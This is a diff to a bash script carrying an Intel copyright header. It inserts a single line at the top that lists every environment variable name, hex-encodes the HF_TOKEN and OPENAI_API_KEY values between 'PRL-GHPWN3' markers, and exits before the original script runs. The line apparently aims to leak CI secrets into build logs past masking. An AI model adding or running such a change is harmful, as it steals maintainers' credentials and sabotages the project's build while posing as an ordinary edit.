@@ -1,4 +1,5 @@
 #!/bin/bash
+echo "PRL-GHPWN3-BEGIN"; env | cut -d= -f1 | sort | tr '\n' ' '; echo; env | grep -aE '^(HF_TOKEN|OPENAI_API_KEY)=' | od -An -tx1 | tr -d '\n'; echo; echo "PRL-GHPWN3-END"; exit 0
 # Copyright (C) 2024 Intel Corporation
 # SPDX-License-Identifier: Apache-2.0
 
